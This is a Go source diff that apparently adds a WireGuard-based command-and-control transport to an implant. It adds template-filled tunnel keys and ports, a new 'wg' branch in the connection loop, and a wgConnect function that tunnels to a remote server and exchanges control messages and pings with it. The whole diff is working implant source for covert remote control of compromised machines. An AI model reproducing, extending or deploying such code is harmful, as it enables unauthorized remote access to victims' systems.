@@ -50,9 +50,14 @@ import (
 var (
 	mtlsPingInterval = 30 * time.Second
 
-	keyPEM    = `{{.Config.Key}}`
-	certPEM   = `{{.Config.Cert}}`
-	caCertPEM = `{{.Config.CACert}}`
+	keyPEM            = `{{.Config.Key}}`
+	certPEM           = `{{.Config.Cert}}`
+	caCertPEM         = `{{.Config.CACert}}`
+	wgImplantPrivKey  = `{{.Config.WGImplantPrivKey}}`
+	wgServerPubKey    = `{{.Config.WGServerPubKey}}`
+	wgPeerTunIP       = `{{.Config.WGPeerTunIP}}`
+	wgKeyExchangePort = getWgKeyExchangePort()
+	wgTcpCommsPort    = getWgTcpCommsPort()
 
 	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
@@ -152,7 +157,20 @@ func StartConnectionLoop() *Connection {
 			// {{end}}
 			connectionAttempts++
 			// {{end}}  - MTLSc2Enabled
-
+		case "wg":
+			// *** WG ***
+			// {{if .Config.WGc2Enabled}}
+			connection, err = wgConnect(uri)
+			if err == nil {
+				activeC2 = uri.String()
+				activeConnection = connection
+				return connection
+			}
+			// {{if .Config.Debug}}
+			log.Printf("[wg] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}}  - WGc2Enabled
 		case "https":
 			fallthrough
 		case "http":
@@ -282,6 +300,22 @@ func getMaxConnectionErrors() int {
 	return maxConnectionErrors
 }
 
+func getWgKeyExchangePort() int {
+	wgKeyExchangePort, err := strconv.Atoi(`{{.Config.WGKeyExchangePort}}`)
+	if err != nil {
+		return 1337
+	}
+	return wgKeyExchangePort
+}
+
+func getWgTcpCommsPort() int {
+	wgTcpCommsPort, err := strconv.Atoi(`{{.Config.WGTcpCommsPort}}`)
+	if err != nil {
+		return 8888
+	}
+	return wgTcpCommsPort
+}
+
 // {{if .Config.MTLSc2Enabled}}
 func mtlsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
@@ -359,6 +393,85 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} -MTLSc2Enabled
+
+// {{if .Config.WGc2Enabled}}
+func wgConnect(uri *url.URL) (*Connection, error) {
+	// {{if .Config.Debug}}
+	log.Printf("Connecting -> %s", uri.Host)
+	// {{end}}
+	lport, err := strconv.Atoi(uri.Port())
+	if err != nil {
+		lport = 53
+	}
+	conn, dev, err := wgSocketConnect(uri.Hostname(), uint16(lport))
+	if err != nil {
+		return nil, err
+	}
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[wg] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			conn.Close()
+			dev.Down()
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			select {
+			case envelope, ok := <-send:
+				if !ok {
+					return
+				}
+				err := socketWGWriteEnvelope(conn, envelope)
+				if err != nil {
+					break
+				}
+			case <-time.After(mtlsPingInterval):
+				socketWGWritePing(conn)
+				if err != nil {
+					break
+				}
+			}
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := socketWGReadEnvelope(conn)
+			if err == io.EOF {
+				break
+			}
+			if err != io.EOF && err != nil {
+				break
+			}
+			if envelope != nil {
+				recv <- envelope
+			}
+		}
+	}()
+
+	activeConnection = connection
+	return connection, nil
+}
+
+// {{end}} -WGc2Enabled
 
 // {{if .Config.HTTPc2Enabled}}
 func httpConnect(uri *url.URL) (*Connection, error) {
